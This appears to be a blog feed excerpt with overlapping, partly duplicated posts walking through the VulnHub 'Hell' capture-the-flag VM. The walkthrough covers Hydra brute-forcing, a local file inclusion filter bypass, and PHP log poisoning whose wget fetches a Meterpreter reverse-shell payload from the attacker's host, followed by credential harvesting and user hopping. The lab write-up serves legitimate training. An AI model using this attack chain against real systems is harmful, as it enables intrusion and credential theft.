Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>

<p>The password is &lsquo;4J0WWvL5nS&rsquo;
[/plain]</p>

<p>Thank you, Jack, for being a predictable - yet persistent - weirdo. A quick hop and a skip over to the worryingly named milk_4_life account and we can carry.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su milk_4_life
Password: 4J0WWvL5nS</p>

<p>$ whoami
milk_4_life
$ [/plain]</p>

<p>Tomorrow we&rsquo;ll play a game. Oooh, cryptic.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough - Part 1]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1/"/>
    <updated>2014-07-17T20:37:23+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough-part-1</id>
    <content type="html"><![CDATA[<p>Part 1 | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | <a href="http://fourfourfourfour.co/2014/07/20/hell-walkthrough-part-4/">Part 4</a> | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>

<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.  This is going to be a multipart walkthrough, therefore keep checking back for updates.</p>

<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>




<!-- more -->


<hr />

<h2>Scoping the Joint</h2>

<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# nmap -sS -T4 &ndash;script banner 192.168.0.103</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 19:39 BST
Nmap scan report for 192.168.0.103
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
80/tcp  open  http
111/tcp open  rpcbind
666/tcp open  doom
|</em>banner: Welcome to the Admin Panel
MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds
[/plain]</p>

<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>

<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>

<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>

<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>

<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>

<hr />

<h2>Getting In</h2>

<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
CeWL 5.0 Robin Wood (<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#114;&#x6f;&#x62;&#105;&#x6e;&#64;&#100;&#105;&#103;&#105;&#x6e;&#x69;&#110;&#106;&#97;&#x2e;&#111;&#114;&#x67;">&#114;&#111;&#98;&#x69;&#110;&#64;&#x64;&#x69;&#103;&#x69;&#x6e;&#x69;&#110;&#106;&#97;&#46;&#x6f;&#x72;&#103;</a>) (www.digininja.org)</p>

<p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
Attribute text found:</p>

<p>Words found</p>

<p>root@pwk:~# john &ndash;wordlist=password_list.txt &ndash;rules &ndash;stdout > password_list-mutated.txt
words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99[/plain]</p>

<p>Now we have a password list, we can use hydra to brute force the login.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# hydra 192.168.0.103 http-form-post &ldquo;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&rdquo; -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>

<p>[WARNING] the waittime you set is low, this can result in errornous results
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-07-17 20:10:12
[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
[DATA] attacking service http-post-form on port 80
[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-07-17 20:10:22[/plain]</p>

<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>

<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>

<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>

<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>

<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>

<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt[/plain]</p>

<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>

<p>[plain gutter=&ldquo;false&rdquo;]msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > run</p>

<p>[<em>] Started reverse handler on 192.168.0.110:443
[</em>] Starting the payload handler&hellip;[/plain]</p>

<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>

<p>[plain gutter=&ldquo;false&rdquo;]&lt;?php echo shell_exec(&lsquo;wget <a href="http://192.168.0.110/sneaky.txt">http://192.168.0.110/sneaky.txt</a> -O /tmp/sneaky.txt 2>&amp;1&rsquo;);?>[/plain]</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>

<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>

<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>

<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>

<p>[plain gutter=&ldquo;false&rdquo;][<em>] Sending stage (40551 bytes) to 192.168.0.103
[</em>] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</p>

<p>meterpreter >[/plain]</p>

<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>

<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]meterpreter > shell
Process 10279 created.
Channel 0 created.
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ [/plain]</p>

<p>BAM ! We&rsquo;ve just started the journey. Now onto <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2">Part 2</a> - which involves further enumeration, and some hopping between users. You&rsquo;re in for a long long ride.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hell Walkthrough]]></title>
    <link href="http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough/"/>
    <updated>2014-07-17T16:17:18+01:00</updated>
    <id>http://recrudesce.github.io/blog/2014/07/17/hell-walkthrough</id>
    <content type="html"><![CDATA[<p>So, <a href="http://netsec.ws">Peleus</a> released a vulnerable VM on <a href="http://www.vulnhub.com">VulnHub</a>, also known as a &ldquo;boot2root&rdquo;, called Hell.</p>

<p>A lot of the techniques in this VM are known to me apart from the very last step. I will go through my thought process for each step and how I managed to go from enumeration to a root shell.</p>

<blockquote>[@0x42424242](https://twitter.com/0x42424242) Finally rooted your fucking VM :P
> 
> &#8211; Russ Watts (@recrudesce) [July 16, 2014](https://twitter.com/recrudesce/statuses/489505727887978496)</blockquote>




<!-- more -->


<hr />

<h2>Scoping the Joint</h2>

<p>NMAP - the start of any fulfilling enumeration stage.  I ran a simple NMAP scan against the VM, which returned the following results</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# nmap -sS -T4 &ndash;script banner 192.168.0.103</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 19:39 BST
Nmap scan report for 192.168.0.103
Host is up (0.00012s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
|<em>banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
80/tcp  open  http
111/tcp open  rpcbind
666/tcp open  doom
|</em>banner: Welcome to the Admin Panel
MAC Address: 08:00:27:FF:3F:A0 (Cadmus Computer Systems)</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 5.20 seconds
[/plain]</p>

<p>OK, so we have SSH, HTTP and apparently Doom (<a href="http://www.kongregate.com/games/mike_id/doom-1">yay Doom !</a>) servers running. Based on previous experience, port 666 is more likely to be a service that is hidden behind a well known port. I wont go into the details of port 666 nor the service behind it, but lets say it&rsquo;s a distraction and a diversionary tactic - don&rsquo;t go there unless you want to waste time.  Unless you want to waste time, in which case fire up Netcat and go for your life !</p>

<p>Visting the web server in a browser presents a pretty boring page that welcomes us to the server and shows a cartoon.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_001.png" alt="" /></a></p>

<p>This doesn&rsquo;t give us much to go on, therefore let&rsquo;s try out some simple things any pentester should try - let&rsquo;s see if a robots.txt file exists.  Well what do you know&hellip;</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_002.png" alt="" /></a></p>

<p>The /personal/ folder shows a creepy shrine site (this is incidentally the closest I&rsquo;ve ever been to the face of a cow)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_003.png" alt="" /></a></p>

<p>Yeah, creepy&hellip; The /super_secret_login_path_muhahaha/ folder presents a login page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_004.png" alt="" /></a></p>

<hr />

<h2>Getting In</h2>

<p>It is assumed the username is either <strong>admin</strong> or <strong>jack</strong>, and the password relates to g0tmi1k in some way because this Jack guy is quite smitten. I could run Rockyou against the login page, but let&rsquo;s think simpler and first make a word list from the shrine site and mutate it a little with John The Ripper using a modified ruleset as per <a href="http://netsec.ws/?p=457">netsec.ws</a></p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# cewl <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a> -d 1 -m 6 -w password_list.txt -v
CeWL 5.0 Robin Wood (<a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x72;&#x6f;&#x62;&#105;&#x6e;&#x40;&#x64;&#x69;&#x67;&#105;&#x6e;&#x69;&#110;&#106;&#x61;&#x2e;&#111;&#x72;&#x67;">&#114;&#x6f;&#98;&#x69;&#x6e;&#x40;&#100;&#x69;&#103;&#105;&#110;&#x69;&#110;&#x6a;&#97;&#46;&#x6f;&#x72;&#x67;</a>) (www.digininja.org)</p>

<p>Starting at <a href="http://192.168.0.103/personal/">http://192.168.0.103/personal/</a>
Visiting: <a href="http://192.168.0.103/personal/,">http://192.168.0.103/personal/,</a> got response code 200
Attribute text found:</p>

<p>Words found</p>

<p>root@pwk:~# john &ndash;wordlist=password_list.txt &ndash;rules &ndash;stdout > password_list-mutated.txt
words: 4251  time: 0:00:00:00 DONE (Thu Jul 17 20:08:13 2014)  w/s: 47233  current: forever99[/plain]</p>

<p>Now we have a password list, we can use hydra to brute force the login.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# hydra 192.168.0.103 http-form-post &ldquo;/super_secret_login_path_muhahaha/login.php:username=^USER^&amp;password=^PASS^:Login Failed&rdquo; -l jack -P password_list-mutated.txt -t 20 -w 1 -o hydra-http-post-attack.txt
Hydra v7.6 &copy;2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>

<p>[WARNING] the waittime you set is low, this can result in errornous results
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2014-07-17 20:10:12
[DATA] 20 tasks, 1 server, 4251 login tries (l:1/p:4251), ~212 tries per task
[DATA] attacking service http-post-form on port 80
[80][www-form] host: 192.168.0.103   login: jack   password: g0tmi1k69
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2014-07-17 20:10:22[/plain]</p>

<p>Success, username <strong>jack</strong>, password <strong>g0tmi1k69</strong> (yes, more creepiness, this Jack guy needs locking up). Using these credentials presents us with a management style interface</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_005.png" alt="" /></a></p>

<p>I won&rsquo;t explain each section, but the two sections we are going to use are Notes and Personal.
Notes allows us to write arbitrary text to a note.txt file stored in &ldquo;temporary storage&rdquo;, which is assumed to be /tmp as this is usually what people define as temporary storage.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_009.png" alt="hell_009" /></a></p>

<p>Personal presents another login page, which sets a cookie which has an attribute that increases with each failed login.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_006.png" alt="" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_007.png" alt="" /></a></p>

<p>When you hit 3 failed logins, the page reverts to the main panel, and adds an error message to the top.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_015.png" alt="hell_015" /></a></p>

<p>On further investigation, the <strong>intruder</strong> attribute of the cookie is set which defines the file that is included at the top of the panel. I wonder if there&rsquo;s a local file inclusion vulnerability there.  I went about editing the cookie to try and include other files on the filesystem.  After a few minutes of frustration, I worked out that the code was filtering any instance of ../ in the include path - however, being the sneaky person I am, I discovered this can be bypassed by using &hellip;.// or &hellip;/./ instead.  Here&rsquo;s /etc/passwd included by setting the <strong>intruder</strong> cookie attribute to &hellip;.//&hellip;.//&hellip;.//&hellip;.//etc/passwd</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_008.png" alt="hell_008" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_010.png" alt="" /></a></p>

<p>It looks like the page parses any code (HTML etc) in the included file, therefore we can poison the note.txt file with PHP via the Notes feature, and include it to execute the code.  First, a PHP based reverse staged Meterpreter is created and hosted on an HTTP server.</p>

<p>[plain gutter=&ldquo;false&rdquo;]root@pwk:~# msfpayload php/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=443 R > sneaky.txt[/plain]</p>

<p>As we are using a staged payload, a handler is required, therefore one is set up via Metasploit</p>

<p>[plain gutter=&ldquo;false&rdquo;]msf > use multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > set lhost 192.168.0.110
lhost => 192.168.0.110
msf exploit(handler) > run</p>

<p>[<em>] Started reverse handler on 192.168.0.110:443
[</em>] Starting the payload handler&hellip;[/plain]</p>

<p>Once the failed login cookie is cleared to allow us to get to features again, the following is added to the note.txt file via the Notes feature, which will download our payload from our HTTP server to the /tmp folder on the host</p>

<p>[plain gutter=&ldquo;false&rdquo;]&lt;?php echo shell_exec(&lsquo;wget <a href="http://192.168.0.110/sneaky.txt">http://192.168.0.110/sneaky.txt</a> -O /tmp/sneaky.txt 2>&amp;1&rsquo;);?>[/plain]</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_011.png" alt="hell_011" /></a></p>

<p>Three failed logins are once again performed via the Personal feature to create the cookie, which is modified to include /tmp/note.txt (which includes our download PHP command)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_012.png" alt="hell_012" /></a></p>

<p>When the main panel page is reloaded, our poisoned note.txt file is included, the PHP is parsed and our payload file is downloaded.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_013.png" alt="hell_013" /></a></p>

<p>We&rsquo;re onto something here !  The cookie is edited once again to include /tmp/sneaky.txt and the panel page reloaded to execute stage 1 of our Meterpreter payload, which makes a connection to our waiting handler.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/hell_014.png" alt="hell_014" /></a></p>

<p>[plain gutter=&ldquo;false&rdquo;][<em>] Sending stage (40551 bytes) to 192.168.0.103
[</em>] Meterpreter session 1 opened (192.168.0.110:443 -> 192.168.0.103:48153) at 2014-07-17 21:55:37 +0100</p>

<p>meterpreter >[/plain]</p>

<p>Now would be a good time for a party, but there&rsquo;s hacking to do.  Plus I have no cake or balloons.  Or friends. <em><em>whimper</em></em> &hellip; HACKING !!!</p>

<p>The Metepreter session can be used to get a shell, which doesn&rsquo;t seem to be TTY, but we can fix that with a nifty command thanks to <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmi1k</a> himself (who is presumably hiding from Jack, the creepy so-and-so). The id command shows that we are currently under the context of the www-data user.</p>

<p>[plain gutter=&ldquo;false&rdquo;]meterpreter > shell
Process 10279 created.
Channel 0 created.
python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ [/plain]</p>

<p>BAM ! We&rsquo;ve just started the journey.</p>

<p>Catting /etc/passwd gives us a list of users that are potentially useful</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
[/plain]</p>

<hr />

<h2>Imagine Jack and Jill, But With Half the Cast Replaced with a Cardboard Cutout of g0tmi1k</h2>

<p>Escalating from the www-data user to the jack user is pretty inconsequential. People who write web sites, especially disturbing ones such as this, will usually not bother to create separate accounts for things such as database logins.</p>

<p>A quick grep on the files in /super_secret_login_path_muhahaha/ for the word &ldquo;password&rdquo; results in the following</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ grep password /var/www/super_secret_login_path_muhahaha/<em>
index.php:<INPUT name="password" id="password" type="password" value=""/>
login.php:  $password = mysql_escape_string($_POST[&ldquo;password&rdquo;]);
login.php:  // mysql_connect(&ldquo;127.0.0.1&rdquo;, &ldquo;Jack&rdquo;, &ldquo;zgcR6mU6pX&rdquo;) or die (&ldquo;Server Error&rdquo;); I&rsquo;ll change this back once development is done. Got sick of typing my password.
login.php:  $sql = &ldquo;SELECT COUNT(</em>) FROM users WHERE username=&lsquo;$username&rsquo; and password=&lsquo;$password&rsquo;&rdquo;;
personal.php:<INPUT name="password" id="password" type="password" value=""/>
[/plain]</p>

<p>Oooh, what do I spy with my little eye ? Could that be Jack&rsquo;s password commented out in login.php ? Let us try this password&hellip;</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ su jack
Password: zgcR6mU6pX</p>

<p>$ whoami
jack
$[/plain]</p>

<p>Well, that was easy. But then the 2nd hurdle usually is - you kinda get cocky after clearing the first one, that the second one is jumped based on pure thrill. Now we get to trip over on every hurdle between us and the finish line. Get the first aid kit ready, we&rsquo;re going to need it.</p>

<hr />

<h2>Got Milk ? Want Any ?</h2>

<p>Poking around Jack&rsquo;s home folder is like walking into a public toilet while bursting for a wee - you don&rsquo;t really want to touch anything, but have to else you&rsquo;re going to have problems.</p>

<p>The first thing that draws my eye is the g0tmi1k_pics folder. It&rsquo;s somewhere you know you don&rsquo;t want to go, but seems to have this strange come-hither vibe about it. It&rsquo;s like a car crash&hellip; gruesome but you can&rsquo;t help but look. So I did. Now I wish I didn&rsquo;t. Exhibit A, and B, and C.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/1.jpg" alt="1" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/2.jpg" alt="2" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/07/3.jpg" alt="3" /></a></p>

<p>Yeah&hellip;
Jack, you&rsquo;re a strange one, I&rsquo;ll give you that. Hang on, I think I can hear the men in white coats knocking. Yup, they&rsquo;re asking for you - shall I tell them you&rsquo;re &ldquo;out&rdquo; ?</p>

<p>So, while Jack might reuse passwords, he&rsquo;s sensible enough to use PGP when sending emails. /var/mail/jack/received contains an email, which is encrypted.</p>

<p>[plain]
&mdash;&ndash;BEGIN PGP MESSAGE&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
&mdash;&ndash;END PGP MESSAGE&mdash;&ndash;[/plain]</p>

<p>As suspected, Jack uses PGP on the local host, therefore his PGP keys are stored in /home/jack/.pgp, complete with a note giving us a password hint.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ls -l .pgp
ls -l .pgp
total 12
-rwx&mdash;&mdash; 1 jack jack   39 Jun 18 12:35 note
-rwx&mdash;&mdash; 1 jack jack 1802 Jun 18 12:20 pgp.priv
-rwx&mdash;&mdash; 1 jack jack  890 Jun 18 12:24 pgp.pub
$ cat .pgp/note
The usual password as with everything.
$
[/plain]</p>

<p>We can assume the password is either <strong>g0tmi1k69</strong> or <strong>zgcR6mU6pX</strong>. GPG is installed, so the next logical step is to try and decrypt the email using either of these two passwords and Jack&rsquo;s PGP private key.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ gpg &ndash;import .pgp/pgp.priv
